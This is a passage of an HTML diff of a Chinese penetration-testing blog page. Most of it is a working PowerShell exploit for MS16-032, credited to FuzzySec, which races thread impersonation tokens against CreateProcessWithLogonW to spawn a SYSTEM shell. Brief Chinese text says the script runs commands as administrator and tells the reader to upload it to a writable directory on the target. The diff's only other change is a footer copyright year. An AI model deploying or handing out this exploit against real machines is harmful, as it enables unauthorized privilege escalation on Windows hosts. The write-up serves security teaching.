+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Ntdll]</span><span class="p">::</span><span class="n">NtImpersonateThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">,</span> <span class="nv">$Thread</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$sqos</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$CallResult</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo </span><span class="s2">&#34;[!] NtImpersonateThread failed, moving on..&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo </span><span class="s2">&#34;[+] Thread resumed!&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">Return</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        <span class="nv">$script:SysTokenHandle</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># 0x0006 --&gt; TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">OpenThreadToken</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">,</span> <span class="n">0x0006</span><span class="p">,</span> <span class="nv">$false</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$SysTokenHandle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(!</span><span class="nv">$CallResult</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo </span><span class="s2">&#34;[!] OpenThreadToken failed, moving on..&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo </span><span class="s2">&#34;[+] Thread resumed!&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">Return</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[?] Success, open SYSTEM token handle: $SysTokenHandle&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[+] Resuming thread..&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c"># main() &lt;--- ;)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ms16032</span> <span class="p">=</span> <span class="sh">@&#34;
+</span></span></span><span class="line"><span class="cl"><span class="sh">     __ __ ___ ___   ___     ___ ___ ___ 
+</span></span></span><span class="line"><span class="cl"><span class="sh">    |  V  |  _|_  | |  _|___|   |_  |_  |
+</span></span></span><span class="line"><span class="cl"><span class="sh">    |     |_  |_| |_| . |___| | |_  |  _|
+</span></span></span><span class="line"><span class="cl"><span class="sh">    |_|_|_|___|_____|___|   |___|___|___|
+</span></span></span><span class="line"><span class="cl"><span class="sh">                                        
+</span></span></span><span class="line"><span class="cl"><span class="sh">                   [by b33f -&gt; @FuzzySec]
+</span></span></span><span class="line"><span class="cl"><span class="sh">&#34;@</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nv">$ms16032</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c"># Check logical processor count, race condition requires 2+</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[?] Operating system core count: </span><span class="p">$(</span><span class="no">[System.Environment]</span><span class="p">::</span><span class="n">ProcessorCount</span><span class="p">)</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">($(</span><span class="no">[System.Environment]</span><span class="p">::</span><span class="n">ProcessorCount</span><span class="p">)</span> <span class="o">-lt</span> <span class="n">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[!] This is a VM isn&#39;t it, race condition requires at least 2 CPU cores, exiting!</span><span class="se">`n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">Return</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c"># Create array for Threads &amp; TID&#39;s</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ThreadArray</span> <span class="p">=</span> <span class="p">@()</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$TidArray</span> <span class="p">=</span> <span class="p">@()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">echo </span><span class="s2">&#34;[&gt;] Duplicating CreateProcessWithLogonW handles..&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="c"># Loop Get-ThreadHandle and collect thread handles with a valid TID</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">-lt</span> <span class="n">500</span><span class="p">;</span> <span class="nv">$i</span><span class="p">++)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hThread</span> <span class="p">=</span> <span class="nb">Get-ThreadHandle</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hThreadID</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">GetThreadId</span><span class="p">(</span><span class="nv">$hThread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Bit hacky/lazy, filters on uniq/valid TID&#39;s to create $ThreadArray</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$TidArray</span> <span class="o">-notcontains</span> <span class="nv">$hThreadID</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$TidArray</span> <span class="p">+=</span> <span class="nv">$hThreadID</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$hThread</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$ThreadArray</span> <span class="p">+=</span> <span class="nv">$hThread</span> <span class="c"># This is what we need!</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">($(</span><span class="nv">$ThreadArray</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="o">-eq</span> <span class="n">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[!] No valid thread handles were captured, exiting!&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">Return</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[?] Done, got </span><span class="p">$(</span><span class="nv">$ThreadArray</span><span class="p">.</span><span class="n">length</span><span class="p">)</span><span class="s2"> thread handle(s)!&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[?] Thread handle list:&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ThreadArray</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[*] Sniffing out privileged impersonation token..&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$Thread</span> <span class="k">in</span> <span class="nv">$ThreadArray</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        <span class="c"># Get handle to SYSTEM access token</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">Get-SystemToken</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[*] Sniffing out SYSTEM shell..&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;</span><span class="se">`n</span><span class="s2">[&gt;] Duplicating SYSTEM token&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$hDuplicateTokenHandle</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">DuplicateToken</span><span class="p">(</span><span class="nv">$SysTokenHandle</span><span class="p">,</span> <span class="n">2</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$hDuplicateTokenHandle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># Simple PS runspace definition</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[&gt;] Starting token race&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$Runspace</span> <span class="p">=</span> <span class="no">[runspacefactory]</span><span class="p">::</span><span class="n">CreateRunspace</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartTokenRace</span> <span class="p">=</span> <span class="no">[powershell]</span><span class="p">::</span><span class="n">Create</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">runspace</span> <span class="p">=</span> <span class="nv">$Runspace</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$Runspace</span><span class="p">.</span><span class="n">Open</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="no">[void]</span><span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">AddScript</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="k">Param</span> <span class="p">(</span><span class="nv">$Thread</span><span class="p">,</span> <span class="nv">$hDuplicateTokenHandle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="p">(</span><span class="nv">$true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">SetThreadToken</span><span class="p">(</span><span class="no">[ref]</span><span class="nv">$Thread</span><span class="p">,</span> <span class="nv">$hDuplicateTokenHandle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}).</span><span class="n">AddArgument</span><span class="p">(</span><span class="nv">$Thread</span><span class="p">).</span><span class="n">AddArgument</span><span class="p">(</span><span class="nv">$hDuplicateTokenHandle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$AscObj</span> <span class="p">=</span> <span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">BeginInvoke</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nb">echo </span><span class="s2">&#34;[&gt;] Starting process race&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Adding a timeout (10 seconds) here to safeguard from edge-cases</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$SafeGuard</span> <span class="p">=</span> <span class="no">[diagnostics.stopwatch]</span><span class="p">::</span><span class="n">StartNew</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="nv">$SafeGuard</span><span class="p">.</span><span class="n">ElapsedMilliseconds</span> <span class="o">-lt</span> <span class="n">10000</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># StartupInfo Struct</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">STARTUPINFO</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">cb</span> <span class="p">=</span> <span class="no">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$StartupInfo</span><span class="p">)</span> <span class="c"># Struct Size</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">dwFlags</span> <span class="p">=</span> <span class="n">0x00000101</span> <span class="c"># STARTF_USESTDHANDLES</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$StartupInfo</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="p">=</span> <span class="n">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># ProcessInfo Struct</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ProcessInfo</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">PROCESS_INFORMATION</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># CreateProcessWithLogonW --&gt; lpCurrentDirectory</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$GetCurrentPath</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-Item</span> <span class="n">-Path</span> <span class="s2">&#34;.\&#34;</span> <span class="n">-Verbose</span><span class="p">).</span><span class="n">FullName</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">CreateProcessWithLogonW</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;user&#34;</span><span class="p">,</span> <span class="s2">&#34;domain&#34;</span><span class="p">,</span> <span class="s2">&#34;pass&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">0x00000002</span><span class="p">,</span> <span class="nv">$Application</span><span class="p">,</span><span class="nv">$Commandline</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">0x00000004</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$GetCurrentPath</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="no">[ref]</span><span class="nv">$StartupInfo</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$ProcessInfo</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c">#---</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.</span>
+</span></span><span class="line"><span class="cl">        <span class="c">#---</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Missing this check used to cause the exploit to fail sometimes.</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># If CreateProcessWithLogon fails OpenProcessToken won&#39;t succeed</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># but we obviously don&#39;t have a SYSTEM shell :&#39;( . Should be 100%</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># reliable now!</span>
+</span></span><span class="line"><span class="cl">        <span class="c">#---</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(!</span><span class="nv">$CallResult</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>            
+</span></span><span class="line"><span class="cl">        <span class="nv">$hTokenHandle</span> <span class="p">=</span> <span class="no">[IntPtr]</span><span class="p">::</span><span class="n">Zero</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Advapi32]</span><span class="p">::</span><span class="n">OpenProcessToken</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">0x28</span><span class="p">,</span> <span class="no">[ref]</span><span class="nv">$hTokenHandle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># If we can&#39;t open the process token it&#39;s a SYSTEM shell!</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(!</span><span class="nv">$CallResult</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">echo </span><span class="s2">&#34;[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><span class="se">`n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">ResumeThread</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$SafeGuard</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">Return</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="c"># Clean up suspended process</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">TerminateProcess</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">CloseHandle</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$CallResult</span> <span class="p">=</span> <span class="no">[Kernel32]</span><span class="p">::</span><span class="n">CloseHandle</span><span class="p">(</span><span class="nv">$ProcessInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c"># Kill runspace &amp; stopwatch if edge-case</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$StartTokenRace</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$SafeGuard</span><span class="p">.</span><span class="n">Stop</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>该 powershell 可以以管理员身份执行指定的命令。</p>
 <p>先将该脚本上传到可以写入的目标机器的目录中：</p>
@@ -1089,7 +1089,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
